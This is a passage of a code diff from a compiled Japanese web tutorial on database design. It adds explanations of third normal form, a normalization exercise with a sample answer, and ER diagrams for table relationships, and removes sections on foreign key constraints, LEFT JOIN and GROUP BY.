+2NFを満たし、全ての非キーカラムが他の非キーカラムに依存していない（推移的関数従属がない）こと。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"噛み砕いた説明："}),`
+情報が他の情報に `,e.jsx(s.strong,{children:"間接的に依存しないようにする"}),"。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"例："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-4",children:[e.jsxs("div",{className:"p-4 bg-red-50 rounded border border-red-200",children:[e.jsx("div",{className:"font-medium text-red-800 mb-2",children:"非3NF（NG）"}),e.jsx("div",{className:"overflow-x-auto",children:e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-red-100",children:[e.jsx("th",{className:"p-2 border",children:"教師ID"}),e.jsx("th",{className:"p-2 border",children:"教師名"}),e.jsx("th",{className:"p-2 border",children:"学部ID"}),e.jsx("th",{className:"p-2 border",children:"学部名"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"T001"}),e.jsx("td",{className:"p-2 border",children:"山田先生"}),e.jsx("td",{className:"p-2 border",children:"D01"}),e.jsx("td",{className:"p-2 border text-red-600",children:"理学部"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-2 border",children:"T002"}),e.jsx("td",{className:"p-2 border",children:"佐藤先生"}),e.jsx("td",{className:"p-2 border",children:"D01"}),e.jsx("td",{className:"p-2 border text-red-600",children:"理学部"})]})]})]})}),e.jsx("div",{className:"text-xs text-red-600 mt-2",children:"問題: 学部名は学部IDに依存（推移的依存: 教師ID → 学部ID → 学部名）"})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"第3正規形（OK）- テーブルを分割"}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"教師テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"教師ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"教師名"}),e.jsx("th",{className:"p-1 border text-xs",children:"学部ID"})]})}),e.jsxs("tbody",{children:[e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"T001"}),e.jsx("td",{className:"p-1 border text-xs",children:"山田先生"}),e.jsx("td",{className:"p-1 border text-xs",children:"D01"})]}),e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"T002"}),e.jsx("td",{className:"p-1 border text-xs",children:"佐藤先生"}),e.jsx("td",{className:"p-1 border text-xs",children:"D01"})]})]})]})]}),e.jsxs("div",{children:[e.jsx("div",{className:"text-xs font-medium mb-1",children:"学部テーブル"}),e.jsxs("table",{className:"text-sm w-full",children:[e.jsx("thead",{children:e.jsxs("tr",{className:"bg-green-100",children:[e.jsx("th",{className:"p-1 border text-xs",children:"学部ID"}),e.jsx("th",{className:"p-1 border text-xs",children:"学部名"})]})}),e.jsx("tbody",{children:e.jsxs("tr",{children:[e.jsx("td",{className:"p-1 border text-xs",children:"D01"}),e.jsx("td",{className:"p-1 border text-xs",children:"理学部"})]})})]})]})]})]})]})})]}),`
+`,e.jsxs(n,{summary:"[演習] 非正規系データの正規化",children:[e.jsx(r,{type:"warning",title:"課題",children:e.jsx(s.p,{children:"ある会社の社員管理システムで使われているデータがあります。サンプルデータを参考に、draw.io で正規化されたER図を作成してください。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"サンプルデータ："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"社員ID"}),e.jsx(s.th,{children:"社員名"}),e.jsx(s.th,{children:"部署名"}),e.jsx(s.th,{children:"オフィス所在地"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"1"}),e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"営業部"}),e.jsx(s.td,{children:"東京"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"2"}),e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:"営業部"}),e.jsx(s.td,{children:"東京"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"3"}),e.jsx(s.td,{children:"鈴木一郎"}),e.jsx(s.td,{children:"開発部"}),e.jsx(s.td,{children:"大阪"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"4"}),e.jsx(s.td,{children:"山田次郎"}),e.jsx(s.td,{children:"開発部"}),e.jsx(s.td,{children:"大阪"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"5"}),e.jsx(s.td,{children:"高橋美咲"}),e.jsx(s.td,{children:"人事部"}),e.jsx(s.td,{children:"東京"})]})]})]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ヒント："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"部署名とオフィス所在地の関係に注目しよう"}),`
+`,e.jsx(s.li,{children:"同じ情報が繰り返されている箇所はどこ？"}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"条件："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"リレーション / キー の記載はなくて良い"}),`
+`,e.jsx(s.li,{children:"日本語での記載で良い"}),`
+`]}),e.jsxs(r,{type:"tip",title:"追加チャレンジ",children:[e.jsx(s.p,{children:"課題が終わったら以下にもチャレンジしてみよう！"}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"テーブル名 / カラム名 を英単語にしてみよう"}),`
+`,e.jsx(s.li,{children:"キー（PK / FK）を割り振ってみよう"}),`
+`,e.jsx(s.li,{children:"リレーションを定義してみよう"}),`
+`]})]}),e.jsxs(n,{summary:"[回答例] 演習が完了してから見てください",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化のポイント："})}),e.jsxs(s.ol,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"第2正規形（2NF）"}),": 部署情報を別テーブルに分離"]}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"第3正規形（3NF）"}),": オフィス所在地は部署に依存（推移的依存）なので、オフィステーブルに分離"]}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化後のテーブル構成（日本語版）："})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{className:"p-3 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"社員テーブル"}),e.jsxs("div",{className:"text-sm text-blue-700 space-y-1",children:[e.jsx("div",{children:"社員ID（PK）"}),e.jsx("div",{children:"社員名"}),e.jsx("div",{children:"部署ID（FK）"})]})]}),e.jsxs("div",{className:"p-3 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"部署テーブル"}),e.jsxs("div",{className:"text-sm text-green-700 space-y-1",children:[e.jsx("div",{children:"部署ID（PK）"}),e.jsx("div",{children:"部署名"}),e.jsx("div",{children:"オフィスID（FK）"})]})]}),e.jsxs("div",{className:"p-3 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800 mb-2",children:"オフィステーブル"}),e.jsxs("div",{className:"text-sm text-orange-700 space-y-1",children:[e.jsx("div",{children:"オフィスID（PK）"}),e.jsx("div",{children:"所在地"})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"ER図（英語版 + キー + リレーション）："})}),e.jsx(i,{children:`
+erDiagram
+  employees {
+      int id PK
+      varchar name
+      int department_id FK
+  }
+
+  departments {
+      int id PK
+      varchar name
+      int office_id FK
+  }
+
+  offices {
+      int id PK
+      varchar location
+  }
+
+  employees }o--|| departments : "所属"
+  departments }o--|| offices : "配置"
+`}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"リレーションの解説："})}),e.jsxs(s.ul,{children:[`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"社員 → 部署"}),": 多対1（複数の社員が1つの部署に所属）"]}),`
+`,e.jsxs(s.li,{children:[e.jsx(s.strong,{children:"部署 → オフィス"}),": 多対1（複数の部署が1つのオフィスに配置）"]}),`
+`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"正規化によって解決された問題："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"部署名やオフィス所在地の重複がなくなった"}),`
+`,e.jsx(s.li,{children:"部署の所在地を変更する場合、オフィステーブルの1行を更新するだけでOK"}),`
+`]})]})]}),`
+`,e.jsx(s.h2,{children:"リレーション"}),`
+`,e.jsxs(n,{summary:"1対1（One-to-One）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
+一つのレコードが別のテーブルのただ一つのレコードとだけ関連づけられる関係。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
+主キーを外部キーとして別のテーブルに設定する。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
+erDiagram
+  users {
+      int user_id PK
+      varchar username
+      varchar email
+  }
+
+  user_profiles {
+      int profile_id PK
+      int user_id FK
+      varchar address
+      date birthday
+      varchar phone
+  }
+
+  users ||--|| user_profiles : "has"
+`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"1対1リレーションの使用例"}),e.jsx("div",{className:"text-sm text-blue-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"ユーザー"})," と ",e.jsx("strong",{children:"ユーザープロフィール"}),e.jsx("br",{}),`
+1人のユーザーには1つのプロフィールが対応し、1つのプロフィールは1人のユーザーにのみ属する`]})})]})}),e.jsx(r,{type:"tip",title:"1対1リレーションを使う場面",children:e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"テーブルを機能的に分割したい場合"}),`
+`,e.jsx(s.li,{children:"アクセス頻度の異なるデータを分離したい場合"}),`
+`,e.jsx(s.li,{children:"セキュリティ上の理由でデータを分離したい場合"}),`
+`]})})]}),`
+`,e.jsxs(n,{summary:"1対多（One-to-Many）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
+一つのレコードが別のテーブルの複数のレコードと関連づけられる関係。最も一般的なリレーションタイプです。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
+"多" 側のテーブルに "一" 側のテーブルの主キーを外部キーとして設定する。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
+erDiagram
+  departments {
+      int dept_id PK
+      varchar dept_name
+  }
+
+  employees {
+      int emp_id PK
+      varchar emp_name
+      int dept_id FK
+  }
+
+  departments ||--o{ employees : "所属"
+`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"1対多リレーションの使用例"}),e.jsx("div",{className:"text-sm text-green-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"部署"})," と ",e.jsx("strong",{children:"社員"}),e.jsx("br",{}),`
+1つの部署には複数の社員が所属できるが、1人の社員は1つの部署にのみ所属する`]})})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"その他の例："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"顧客 と 注文（1人の顧客は複数の注文を行える）"}),`
+`,e.jsx(s.li,{children:"カテゴリ と 商品（1つのカテゴリには複数の商品が属する）"}),`
+`,e.jsx(s.li,{children:"著者 と 記事（1人の著者は複数の記事を執筆できる）"}),`
+`]})]}),`
+`,e.jsxs(n,{summary:"多対多（Many-to-Many）リレーション",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"解説："}),`
+複数のレコードが別のテーブルの複数のレコードと関連づけられる関係。この関係を直接的に表現することはできないため、`,e.jsx(s.strong,{children:"中間テーブル"}),"を用いて関連づけます。"]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"中間テーブルとは："}),`
+二つのテーブル間の多対多の関係を管理するために使用されるテーブル。各レコードは、関連する二つのテーブルのレコード間のリンクを表します。`]}),e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"定義方法："}),`
+中間テーブルには、関連する二つのテーブルの主キーを外部キーとして含める。これらの外部キーの組み合わせが中間テーブルのユニークキーまたはプライマリキーになります。`]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実例："})}),e.jsx(i,{children:`
+erDiagram
+  students {
+      int student_id PK
+      varchar name
+  }
+
+  courses {
+      int course_id PK
+      varchar course_name
+  }
+
+  enrollments {
+      int enrollment_id PK
+      int student_id FK
+      int course_id FK
+      date enrolled_at
+  }
+
+  students ||--o{ enrollments : "受講"
   courses ||--o{ enrollments : "開講"
-  instructors ||--o{ courses : "担当"
-`}),e.jsx(r,{type:"success",title:"ER図の読み方",children:e.jsx(s.p,{children:"ER図（Entity Relationship Diagram）は、テーブル間の関係性を視覚的に表現したものです。エンティティ（四角）とリレーションシップ（線）でデータベース構造を明確にします。"})})]}),`
-`,e.jsx(s.h2,{children:"外部キー（Foreign Key）の理解"}),`
-`,e.jsxs(n,{summary:"外部キーとは何か？",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"外部キー"}),"とは、他のテーブルの主キーを参照する列のことです。テーブル同士の関連性を表現し、データの整合性を保つ重要な仕組みです。"]}),e.jsx(r,{type:"info",title:"外部キーの役割",children:e.jsx(s.p,{children:"外部キーは「このIDは、あのテーブルの特定の行を指しています」という関係性を明示します。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"学習管理システムでの外部キー例："})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-6",children:[e.jsxs("div",{className:"p-4 bg-blue-50 rounded border border-blue-200",children:[e.jsx("div",{className:"font-medium text-blue-800 mb-2",children:"courses テーブル"}),e.jsxs("div",{className:"text-sm text-blue-700 space-y-1",children:[e.jsx("div",{children:"id: 1, name: PHP基礎"}),e.jsx("div",{className:"font-bold",children:"instructor_id: 1 ← 外部キー"}),e.jsx("div",{children:"fee: 50000"})]})]}),e.jsxs("div",{className:"p-4 bg-green-50 rounded border border-green-200",children:[e.jsx("div",{className:"font-medium text-green-800 mb-2",children:"instructors テーブル"}),e.jsxs("div",{className:"text-sm text-green-700 space-y-1",children:[e.jsx("div",{className:"font-bold",children:"id: 1 ← 参照される主キー"}),e.jsx("div",{children:"name: 佐藤先生"}),e.jsxs("div",{children:["email: ",e.jsx(s.a,{href:"mailto:sato@school.com",children:"sato@school.com"})]})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"外部キー制約の定義："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- コーステーブルで外部キー制約を設定
-CREATE TABLE courses (
-    id INT PRIMARY KEY AUTO_INCREMENT,
-    name VARCHAR(64) NOT NULL,
-    instructor_id INT NOT NULL,              -- これが外部キー
-    fee INT NOT NULL,
-    FOREIGN KEY (instructor_id) REFERENCES instructors(id)  -- 外部キー制約
-);
-`})})]}),`
-`,e.jsxs(n,{summary:"外部キー制約の効果とメリット",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"参照整合性の保証："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- ❌ これは失敗する（instructor_id: 999 は存在しない）
-INSERT INTO courses (name, instructor_id, fee)
-VALUES ('Python基礎', 999, 55000);
--- エラー: Cannot add or update a child row: a foreign key constraint fails
-
--- ✅ これは成功する（instructor_id: 1 は存在する）
-INSERT INTO courses (name, instructor_id, fee)
-VALUES ('Python基礎', 1, 55000);
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"削除時の保護："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- ❌ これは失敗する（佐藤先生はコースを担当中）
-DELETE FROM instructors WHERE id = 1;
--- エラー: Cannot delete or update a parent row: a foreign key constraint fails
-
--- まずコースの担当を変更してから削除する必要がある
-UPDATE courses SET instructor_id = 2 WHERE instructor_id = 1;
-DELETE FROM instructors WHERE id = 1;  -- これで削除可能
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"外部キーのメリット："})}),e.jsx(l,{children:e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-blue-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"データ整合性"}),e.jsx("div",{className:"text-sm text-slate-600",children:"存在しない講師IDでコースを作成できない"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-green-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"カスケード操作"}),e.jsx("div",{className:"text-sm text-slate-600",children:"親データ削除時に関連データも自動削除（オプション）"})]})]}),e.jsxs("div",{className:"flex items-start p-3 bg-slate-50 rounded border border-slate-200",children:[e.jsx("div",{className:"w-6 h-6 text-purple-600 mr-3 mt-0.5",children:e.jsx("svg",{fill:"none",stroke:"currentColor",viewBox:"0 0 24 24",children:e.jsx("path",{strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:2,d:"M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v14a2 2 0 002 2z"})})}),e.jsxs("div",{children:[e.jsx("div",{className:"font-medium text-slate-800",children:"設計の明確化"}),e.jsx("div",{className:"text-sm text-slate-600",children:"テーブル間の関係が明示的になる"})]})]})]})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"カスケード操作の設定例："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`FOREIGN KEY (instructor_id) REFERENCES instructors(id)
-ON DELETE CASCADE    -- 講師削除時に関連コースも削除
-ON UPDATE CASCADE    -- 講師ID変更時に関連コースも更新
-`})})]}),`
+`}),e.jsx(l,{children:e.jsxs("div",{className:"p-4 bg-orange-50 rounded border border-orange-200",children:[e.jsx("div",{className:"font-medium text-orange-800 mb-2",children:"多対多リレーションの使用例"}),e.jsx("div",{className:"text-sm text-orange-700",children:e.jsxs(s.p,{children:[e.jsx("strong",{children:"生徒"})," と ",e.jsx("strong",{children:"授業"}),e.jsx("br",{}),`
+1人の生徒は複数の授業を受講でき、1つの授業には複数の生徒が参加できる`,e.jsx("br",{}),`
+→ `,e.jsx("strong",{children:"中間テーブル（enrollments）"})," で関係を管理"]})})]})}),e.jsx(r,{type:"warning",title:"中間テーブルの重要性",children:e.jsx(s.p,{children:"多対多リレーションは必ず中間テーブルを使って実装します。中間テーブルには追加情報（例：登録日、ステータスなど）を持たせることもできます。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"その他の例："})}),e.jsxs(s.ul,{children:[`
+`,e.jsx(s.li,{children:"商品 と タグ（1つの商品に複数のタグ、1つのタグは複数の商品に付与）"}),`
+`,e.jsx(s.li,{children:"ユーザー と ロール（1人のユーザーに複数のロール、1つのロールは複数のユーザーに割当）"}),`
+`]})]}),`
 `,e.jsx(s.h2,{children:"JOIN（結合）の基本概念"}),`
 `,e.jsxs(n,{summary:"JOINとは何か？",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"JOIN"}),"とは、複数のテーブルを結合してデータを取得するSQL文です。正規化によって分割されたテーブルから、関連するデータを一緒に取得するために使用します。"]}),e.jsx(r,{type:"info",title:"重要なポイント",children:e.jsx(s.p,{children:"外部キー制約がなくてもJOINは実行できますが、制約があった方が安全で信頼できるデータベースになります。JOINは「接着剤」、外部キー制約は「品質管理」の役割です。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"JOINと外部キー制約の関係："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"項目"}),e.jsx(s.th,{children:"外部キー制約あり"}),e.jsx(s.th,{children:"外部キー制約なし"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.strong,{children:"JOINの実行"})}),e.jsx(s.td,{children:"✅ できる"}),e.jsx(s.td,{children:"✅ できる"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.strong,{children:"データ整合性"})}),e.jsx(s.td,{children:"✅ 保証される"}),e.jsx(s.td,{children:"❌ 保証されない"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.strong,{children:"不正データの挿入"})}),e.jsx(s.td,{children:"❌ 防げる"}),e.jsx(s.td,{children:"✅ 可能（危険）"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:e.jsx(s.strong,{children:"参照先の削除"})}),e.jsx(s.td,{children:"❌ 防げる"}),e.jsx(s.td,{children:"✅ 可能（危険）"})]})]})]}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 外部キー制約がなくても、この書き方でJOINできる
 SELECT s.name, c.name
@@ -5119,320 +5178,8 @@ INNER JOIN courses c ON e.course_id = c.id
 INNER JOIN instructors i ON c.instructor_id = i.id
 ORDER BY e.enrollment_date;
 `})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実行結果："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"学生名"}),e.jsx(s.th,{children:"コース名"}),e.jsx(s.th,{children:"担当講師"}),e.jsx(s.th,{children:"受講料"}),e.jsx(s.th,{children:"受講開始日"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"2024-01-15"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"2024-01-16"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"React応用"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"60000"}),e.jsx(s.td,{children:"2024-01-17"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"鈴木一郎"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"佐藤先生"}),e.jsx(s.td,{children:"50000"}),e.jsx(s.td,{children:"2024-01-18"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"田中先生"}),e.jsx(s.td,{children:"45000"}),e.jsx(s.td,{children:"2024-01-20"})]})]})]}),e.jsx(r,{type:"success",title:"複数テーブルJOINの成功",children:e.jsx(s.p,{children:"4つのテーブルから関連するすべての情報を1つのクエリで取得できました！これが正規化とJOINの力です。"})})]}),`
-`,e.jsx(s.h2,{children:"LEFT JOINの実践演習"}),`
-`,e.jsxs(n,{summary:"LEFT JOIN用の追加データ準備",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"受講していない学生と受講者がいないコースを追加："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 受講していない学生を追加
-INSERT INTO students (name, email, phone) VALUES
-('山田花子', 'yamada@example.com', '080-5555-6666');
-
--- 受講者がいないコースを追加
-INSERT INTO instructors (name, email) VALUES
-('山田先生', 'yamada@school.com');
-
-INSERT INTO courses (name, instructor_id, fee) VALUES
-('Python基礎', 3, 55000);
-`})})]}),`
-`,e.jsxs(n,{summary:"演習4: 全学生の受講状況（受講していない学生も含む）",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"LEFT JOINを使って全学生を表示："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- 全学生を表示（受講していない学生も含む）
-SELECT
-    s.name AS 学生名,
-    c.name AS 受講コース,
-    e.enrollment_date AS 受講開始日
-FROM students s
-LEFT JOIN enrollments e ON s.id = e.student_id
-LEFT JOIN courses c ON e.course_id = c.id
-ORDER BY e.enrollment_date;
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"実行結果："})}),e.jsxs(s.table,{children:[e.jsx(s.thead,{children:e.jsxs(s.tr,{children:[e.jsx(s.th,{children:"学生名"}),e.jsx(s.th,{children:"受講コース"}),e.jsx(s.th,{children:"受講開始日"})]})}),e.jsxs(s.tbody,{children:[e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"2024-01-15"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"佐藤花子"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"2024-01-16"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"React応用"}),e.jsx(s.td,{children:"2024-01-17"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"鈴木一郎"}),e.jsx(s.td,{children:"PHP基礎"}),e.jsx(s.td,{children:"2024-01-18"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"田中太郎"}),e.jsx(s.td,{children:"JavaScript基礎"}),e.jsx(s.td,{children:"2024-01-20"})]}),e.jsxs(s.tr,{children:[e.jsx(s.td,{children:"山田花子"}),e.jsx(s.td,{children:"NULL"}),e.jsx(s.td,{children:"NULL"})]})]})]}),e.jsx(r,{type:"info",title:"LEFT JOINの特徴",children:e.jsx(s.p,{children:"左側（FROM句）のテーブル（students）の全データを表示し、右側に関連データがない場合はNULLで表示されます。山田花子さんは受講していないため、NULLが表示されています。"})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"INNER JOINとの比較："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`-- INNER JOINの場合（受講している学生のみ表示）
-SELECT 
-    s.name AS 学生名,
-    c.name AS 受講コース,
-    e.enrollment_date AS 受講開始日
-FROM students s
-INNER JOIN enrollments e ON s.id = e.student_id
-INNER JOIN courses c ON e.course_id = c.id
-ORDER BY e.enrollment_date;
--- 山田花子は表示されない
-`})})]}),`
-`,e.jsx(s.h2,{children:"GROUP BYによる集計分析"}),`
-`,e.jsxs(n,{summary:"GROUP BYとは何か？",children:[e.jsxs(s.p,{children:[e.jsx(s.strong,{children:"GROUP BY"}),"は、同じ値を持つ行をグループ化してまとめる機能です。集計関数（COUNT、SUM、AVG、MAX、MIN）と組み合わせて使用し、「〜別に集計したい」という場面で活用します。"]}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"基本構文："})}),e.jsx(s.pre,{children:e.jsx(s.code,{className:"language-sql",children:`SELECT
-    グループ化したい列,
-    集計関数(集計したい列)
-FROM テーブル名
-GROUP BY グループ化したい列;
-`})}),e.jsx(s.p,{children:e.jsx(s.strong,{children:"主な集計関数："})}),e.jsx(l,{children:e.jsxs("div",{className:"grid grid-cols-2 md:grid-cols-5 gap-3",children:[e.jsxs("div",{className:"p-3 bg-blue-50 rounded border border-blue-200 text-center",children:[e.jsx("div",{className:"font-medium text-blue-800",children:"COUNT()"}),e.jsx("div",{className:"text-xs text-blue-600",children:"行数をカウント"})]}),e.jsxs("div",{className:"p-3 bg-green-50 rounded border border-green-200 text-center",children:[e.jsx("div",{className:"font-medium text-green-800",children:"SUM()"}),e.jsx("div",{className:"text-xs text-green-600",children:"合計値を計算"})]}),e.jsxs("div",{className:"p-3 bg-orange-50 rounded border border-orange-200 text-center",children:[e.jsx("div",{className:"font-medium text-orange-800",children:"AVG()"}),e.jsx("div",{className:"text-xs text-orange-600",children:"平均値を計算"})]}),e.jsxs("div",{className:"p-3 bg-purple-50 rounded border border-purple-200 text-center",children:[e.jsx("div",{className:"font-medium text-purple-800",children:"MAX()"}),e.jsx("div",{className:"text-xs text-purple-600",children:"最大値を取得"})]}),e.jsxs("div",{className:"p-3 bg-red-50 rounded border border-red-200 text-center",children:[e.jsx("div",{className:"font-medium text-red-800",children:"MIN()"}),e.jsx("div",{className:"text-xs text-red-600",children:"最小値を取得"})]})]})})]}),`
-`,e.jsxs(n,{summary:"演習5: 学生別の受講状況集計",children:[e.jsx(s.p,{children:e.jsx(s.strong,{children:"学生別に受講コース数と支払い総額を集計："})}),e.jsxs(s.ol,{children:[`
-`,e.jsx(s.li,{children:e.jsx(s.strong,{children:"GROUP BYなしで集計関数を使ってみる（エラー例）"})}),`
